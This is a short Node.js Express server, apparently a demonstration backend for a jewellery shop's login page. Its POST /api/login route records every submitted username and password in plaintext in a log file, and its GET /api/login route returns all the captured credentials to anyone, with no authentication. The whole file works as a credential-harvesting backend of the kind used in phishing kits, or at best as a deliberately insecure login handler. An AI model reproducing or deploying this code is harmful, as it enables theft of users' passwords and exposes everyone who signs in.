/*
 * Meenakshi Jewellers — demonstration server
 */

const fs = require('fs');
const path = require('path');
const express = require('express');

const app = express();
const PORT = process.env.PORT || 3000;
const LOG_DIR = path.join(__dirname, 'logs');
const LOGIN_LOG_FILE = path.join(LOG_DIR, 'login-attempts.txt');

fs.mkdirSync(LOG_DIR, { recursive: true });
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/api/login', (req, res) => {
  try {
    const logs = fs.existsSync(LOGIN_LOG_FILE) ? fs.readFileSync(LOGIN_LOG_FILE, 'utf8').trim() : 'No logs yet.';
    res.json({ ok: true, logs });
  } catch (error) {
    res.status(500).json({ ok: false, message: 'Unable to read logs' });
  }
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] username=${username || ''} password=${password || ''}\n`;
  fs.appendFileSync(LOGIN_LOG_FILE, logEntry, 'utf8');
  res.json({ ok: true, message: 'Login attempt recorded.' });
});

app.listen(PORT, () => {
  console.log(`Open http://localhost:${PORT}`);
});
